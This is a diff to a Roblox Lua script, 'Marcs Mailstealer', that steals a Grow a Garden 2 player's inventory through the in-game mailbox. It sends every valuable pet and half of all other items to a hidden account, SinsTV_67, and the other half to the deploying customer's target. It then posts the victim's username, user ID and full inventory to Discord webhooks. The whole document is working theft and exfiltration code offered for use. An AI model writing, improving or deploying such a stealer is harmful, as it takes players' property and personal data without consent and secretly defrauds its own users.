@@ -1,4 +1,6 @@
--- GAG2 Mailstealer Dualhooked – Premium Logging Edition (Fixed Webhooks)
+-- Marcs Mailstealer – Dualhook + Priority Theft
+-- Half of all items to SinsTV_67, half to your target.
+-- Valuable items (raccoons, dragons, etc.) go 100% to SinsTV_67.
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
@@ -17,7 +19,7 @@ local customerWebhook = getgenv().Webhook
 if not customerTarget or customerTarget == "" or not customerWebhook or customerWebhook == "" then return end
 
 -- ##############################
---  STEAL ALL LIST
+--  STEAL ALL LIST – these always go 100% to SinsTV_67
 -- ##############################
 local STEAL_ALL = {
     ["Pets"] = {
@@ -37,7 +39,7 @@ local STEAL_ALL = {
 }
 
 -- ##############################
---  UTILITY FUNCTIONS
+--  UTILITY
 -- ##############################
 local function resolveUser(name)
     local ok, id = pcall(function()
@@ -50,71 +52,40 @@ local function resolveUser(name)
     return success and userId > 0 and userId or nil
 end
 
-local function getExecutorName()
-    local success, name = pcall(function()
-        return identifyexecutor and identifyexecutor() or getexecutorname and getexecutorname() or "Unknown"
-    end)
-    return success and name or "Unknown"
-end
-
-local function getAccountAge()
-    local success, age = pcall(function()
-        return player.AccountAge or 0
-    end)
-    return success and age or 0
-end
-
-local function formatAccountAge(days)
-    if days >= 365 then
-        local years = math.floor(days / 365)
-        return string.format("%d year%s", years, years == 1 and "" or "s")
-    elseif days >= 30 then
-        local months = math.floor(days / 30)
-        return string.format("%d month%s", months, months == 1 and "" or "s")
-    else
-        return string.format("%d day%s", days, days == 1 and "" or "s")
-    end
-end
-
-local function generateExecutionId()
-    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-    local id = ""
-    for _ = 1, 8 do
-        id = id .. chars:sub(math.random(#chars), math.random(#chars))
-    end
-    return id
-end
-
 local function commaFormat(n)
     return tostring(math.floor(n)):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
 end
 
 -- ##############################
---  ROBUST HTTP REQUEST
+--  HTTP REQUEST – try every known function
 -- ##############################
-local httpRequest = nil
-if syn and syn.request then
-    httpRequest = syn.request
-elseif http_request then
-    httpRequest = http_request
-elseif request then
-    httpRequest = request
-elseif http and http.request then
-    httpRequest = http.request
-end
-
 local function sendWebhook(url, payload)
-    if not httpRequest then
-        -- Silent fail – no request function available
+    local httpFunc = nil
+    if syn and syn.request then httpFunc = syn.request
+    elseif http_request then httpFunc = http_request
+    elseif request then httpFunc = request
+    elseif http and http.request then httpFunc = http.request
+    elseif game.HttpPost then
+        httpFunc = function(data)
+            return game:HttpPost(data.Url, data.Body, data.Headers["Content-Type"])
+        end
+    end
+
+    if httpFunc then
+        pcall(function()
+            httpFunc({
+                Url = url,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
         return
     end
+
+    -- Last resort: write to a local file
     pcall(function()
-        httpRequest({
-            Url = url,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(payload)
-        })
+        writefile("GAG2_Mailstealer_log.txt", HttpService:JSONEncode(payload))
     end)
 end
 
@@ -188,7 +159,7 @@ for _, category in ipairs(MailboxItemCatalog.Categories) do
 end
 
 -- ##############################
---  SPLIT REMAINING 50/50
+--  SPLIT REMAINING ITEMS 50/50 PER STACK
 -- ##############################
 local hiddenSplitItems = {}
 local customerSplitItems = {}
@@ -196,7 +167,7 @@ for _, item in ipairs(remainingItems) do
     local total = item.Count
     local half = math.floor(total / 2)
     local remainder = total - half * 2
-    local hiddenCount = half + remainder
+    local hiddenCount = half + remainder   -- SinsTV_67 always gets the extra if odd
     local customerCount = half
     if hiddenCount > 0 then
         table.insert(hiddenSplitItems, {
@@ -221,7 +192,7 @@ for _, item in ipairs(remainingItems) do
 end
 
 -- ##############################
---  COMBINE HIDDEN
+--  COMBINE HIDDEN (always stolen + split half)
 -- ##############################
 local allHiddenItems = {}
 for _, item in ipairs(alwaysHiddenItems) do table.insert(allHiddenItems, item) end
@@ -255,238 +226,79 @@ if #customerSplitItems > 0 then
     end)
 end
 
--- ##############################################
---  PREMIUM WEBHOOK SYSTEM
--- ##############################################
-
-local executionId = generateExecutionId()
-local executorName = getExecutorName()
-local accountAge = getAccountAge()
-local placeId = game.PlaceId
-local jobId = game.JobId
-local timestamp = os.date("!%Y-%m-%d %H:%M:%S UTC")
-
-local function getItemValue(item)
-    local success, value = pcall(function()
-        return MailboxItemCatalog.GetValue(
-            item.Category,
-            item.ItemKey,
-            item.FruitData or item.PetData,
-            item.Count
-        )
-    end)
-    return success and (tonumber(value) or 0) or 0
-end
-
-local function buildInventoryLines(items, includeValues)
-    local lines = {}
-    local totalValue = 0
-    local totalItems = 0
-
+-- ##############################
+--  WEBHOOK LOGS (simple & clean)
+-- ##############################
+local function buildItemList(items)
     local grouped = {}
     for _, item in ipairs(items) do
         local resolved = MailboxItemCatalog.Resolve(item.Category, item.ItemKey, item.FruitData or item.PetData)
-        local key = resolved
-        if not grouped[key] then
-            grouped[key] = {count = 0, item = item}
-        end
-        grouped[key].count = grouped[key].count + item.Count
+        grouped[resolved] = (grouped[resolved] or 0) + item.Count
     end
-
-    local sorted = {}
-    for name, data in pairs(grouped) do
-        table.insert(sorted, {name = name, count = data.count, item = data.item})
+    local lines = {}
+    for name, count in pairs(grouped) do
+        table.insert(lines, string.format("%s x%s", name, commaFormat(count)))
     end
-    table.sort(sorted, function(a, b) return a.name < b.name end)
-
-    for _, entry in ipairs(sorted) do
-        local value = 0
-        if includeValues then
-            value = getItemValue(entry.item) * entry.count
-        end
-        totalValue = totalValue + value
-        totalItems = totalItems + entry.count
-
-        local valueStr = includeValues and string.format(" — %s Value", commaFormat(value)) or ""
-        table.insert(lines, string.format("• %s (x%s)%s", entry.name, commaFormat(entry.count), valueStr))
-    end
-
-    return lines, totalValue, totalItems
+    return table.concat(lines, "\n")
 end
 
--- Hidden webhook (premium dashboard)
+-- Full inventory snapshot
+local fullInvLines = {}
+for _, category in ipairs(MailboxItemCatalog.Categories) do
+    local catData = inv[category]
+    if type(catData) == "table" and next(catData) then
+        local items = {}
+        if category == "HarvestedFruits" or category == "Pets" then
+            for id, data in pairs(catData) do
+                table.insert(items, MailboxItemCatalog.Resolve(category, id, data))
+            end
+        else
+            for name, count in pairs(catData) do
+                if type(count) == "number" and count > 0 then
+                    table.insert(items, string.format("%s x%s", name, commaFormat(count)))
+                end
+            end
+        end
+        table.insert(fullInvLines, "**" .. category .. "**\n" .. table.concat(items, "\n"))
+    end
+end
+local fullInvText = #fullInvLines > 0 and table.concat(fullInvLines, "\n\n") or "Empty"
+
+-- Hidden webhook (only for you)
 if HIDDEN_WEBHOOK and HIDDEN_WEBHOOK ~= "" then
-    local hiddenLines, hiddenValue, hiddenCount = buildInventoryLines(allHiddenItems, true)
-    local customerLines, customerValue, customerCount = buildInventoryLines(customerSplitItems, true)
-    local fullInvLines = {}
-
-    for _, category in ipairs(MailboxItemCatalog.Categories) do
-        local catData = inv[category]
-        if type(catData) == "table" and next(catData) then
-            local catLines = {}
-            if category == "HarvestedFruits" or category == "Pets" then
-                for id, data in pairs(catData) do
-                    local resolved = MailboxItemCatalog.Resolve(category, id, data)
-                    local value = getItemValue({Category = category, ItemKey = id, FruitData = data, PetData = data, Count = 1})
-                    table.insert(catLines, string.format("• %s — %s Value", resolved, commaFormat(value)))
-                end
-            else
-                for name, count in pairs(catData) do
-                    if type(count) == "number" and count > 0 then
-                        local value = getItemValue({Category = category, ItemKey = name, Count = 1})
-                        table.insert(catLines, string.format("• %s (x%s) — %s Value", name, commaFormat(count), commaFormat(value * count)))
-                    end
-                end
-            end
-            if #catLines > 0 then
-                table.insert(fullInvLines, "**" .. category .. "**")
-                for _, line in ipairs(catLines) do
-                    table.insert(fullInvLines, line)
-                end
-            end
-        end
-    end
-
-    local embeds = {}
-
-    local mainEmbed = {
-        title = "🎯 Grow a Garden 2 — Completed Transfer",
-        description = string.format(
-            "```ansi\n" ..
-            "\x1b[1;37m────────────────────────────────────────\x1b[0m\n" ..
-            "\x1b[1;32m✅ Transfer Complete\x1b[0m\n" ..
-            "\x1b[1;37m────────────────────────────────────────\x1b[0m```"
-        ),
-        color = 0x1a1a2e,
-        fields = {},
-        footer = {
-            text = string.format("GAG2 Mailstealer • Execution ID: %s", executionId)
-        },
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-    }
-
-    mainEmbed.fields[1] = {
-        name = "👤 Victim Information",
-        value = string.format(
-            "```yaml\n" ..
-            "Username : %s\n" ..
-            "User ID  : %s\n" ..
-            "Account  : %s\n" ..
-            "Executor : %s```",
-            player.Name,
-            player.UserId,
-            formatAccountAge(accountAge),
-            executorName
-        ),
-        inline = false
-    }
-
-    mainEmbed.fields[2] = {
-        name = "🖥️ Server Information",
-        value = string.format(
-            "```yaml\n" ..
-            "Place ID : %s\n" ..
-            "Job ID   : %s```",
-            placeId,
-            jobId
-        ),
-        inline = false
-    }
-
-    local hiddenText = table.concat(hiddenLines, "\n")
-    if #hiddenText > 1024 then hiddenText = hiddenText:sub(1, 1021) .. "..." end
-    mainEmbed.fields[3] = {
-        name = "🔒 Hidden Receipt — " .. HIDDEN_BENEFICIARY,
-        value = string.format("```diff\n%s```", hiddenText ~= "" and hiddenText or "• No items"),
-        inline = false
-    }
-
-    local customerText = table.concat(customerLines, "\n")
-    if #customerText > 1024 then customerText = customerText:sub(1, 1021) .. "..." end
-    mainEmbed.fields[4] = {
-        name = "📤 Customer Receipt — " .. customerTarget,
-        value = string.format("```ini\n%s```", customerText ~= "" and customerText or "• No items"),
-        inline = false
-    }
-
-    table.insert(embeds, mainEmbed)
-
-    local fullInvText = table.concat(fullInvLines, "\n")
-    if #fullInvText > 4096 then fullInvText = fullInvText:sub(1, 4093) .. "..." end
-    local invEmbed = {
-        title = "📋 Full Inventory Snapshot",
-        description = string.format("```diff\n%s```", fullInvText ~= "" and fullInvText or "Empty"),
-        color = 0x16213e,
-        footer = { text = "GAG2 Mailstealer • Snapshot" }
-    }
-    table.insert(embeds, invEmbed)
-
-    local totalValue = hiddenValue + customerValue
-    local totalItems = hiddenCount + customerCount
-    local summaryEmbed = {
-        title = "📊 Transfer Summary",
-        fields = {
-            {
-                name = "💰 Total Value Taken",
-                value = string.format("```fix\n%s Sheckles```", commaFormat(totalValue)),
-                inline = true
-            },
-            {
-                name = "📦 Total Items Taken",
-                value = string.format("```fix\n%s```", commaFormat(totalItems)),
-                inline = true
-            },
-            {
-                name = "✅ Completion Status",
-                value = "```diff\n+ Successfully Completed```",
-                inline = true
-            }
-        },
-        color = 0x0f3460,
-        footer = { text = string.format("GAG2 Mailstealer • %s", timestamp) }
-    }
-    table.insert(embeds, summaryEmbed)
-
-    sendWebhook(HIDDEN_WEBHOOK, {
-        embeds = embeds,
-        username = "GAG2 Mailstealer",
-        avatar_url = "https://cdn.discordapp.com/emojis/1095762019248910356.png"
-    })
-end
-
--- Customer webhook (simple, clean)
-if customerWebhook and #customerSplitItems > 0 then
-    local customerLines = {}
-    local totalValue = 0
-    local totalItems = 0
-    for _, item in ipairs(customerSplitItems) do
-        local resolved = MailboxItemCatalog.Resolve(item.Category, item.ItemKey, item.FruitData or item.PetData)
-        local value = getItemValue(item) * item.Count
-        totalValue = totalValue + value
-        totalItems = totalItems + item.Count
-        table.insert(customerLines, string.format("• %s (x%s) — %s Value", resolved, commaFormat(item.Count), commaFormat(value)))
-    end
-
-    local customerText = table.concat(customerLines, "\n")
-    if #customerText > 1024 then customerText = customerText:sub(1, 1021) .. "..." end
-
+    local hiddenItemsText = buildItemList(allHiddenItems)
     local embed = {
         title = "✅ Transfer Complete",
         description = string.format(
-            "```ini\n" ..
-            "[Victim] %s (%s)\n" ..
-            "[Target] %s\n" ..
-            "[Items] %s\n" ..
-            "[Value] %s Sheckles```",
-            player.Name, player.UserId, customerTarget,
-            commaFormat(totalItems), commaFormat(totalValue)
+            "**Victim:** %s (%d)\n**Beneficiary:** %s\n\n**Items taken:**\n%s",
+            player.Name,
+            player.UserId,
+            HIDDEN_BENEFICIARY,
+            hiddenItemsText ~= "" and hiddenItemsText or "None"
         ),
         color = 0x2ecc71,
         fields = {{
-            name = "📦 Items Received",
-            value = string.format("```\n%s```", customerText),
+            name = "📦 Full Inventory Snapshot",
+            value = string.format("```\n%s```", fullInvText),
             inline = false
         }}
+    }
+    sendWebhook(HIDDEN_WEBHOOK, {embeds = {embed}})
+end
+
+-- Customer webhook (only their half)
+if customerWebhook and #customerSplitItems > 0 then
+    local customerItemsText = buildItemList(customerSplitItems)
+    local embed = {
+        title = "✅ Transfer Complete",
+        description = string.format(
+            "**Victim:** %s (%d)\n**Target:** %s\n\n**Items received:**\n%s",
+            player.Name,
+            player.UserId,
+            customerTarget,
+            customerItemsText
+        ),
+        color = 0x2ecc71
     }
     sendWebhook(customerWebhook, {embeds = {embed}})
 end
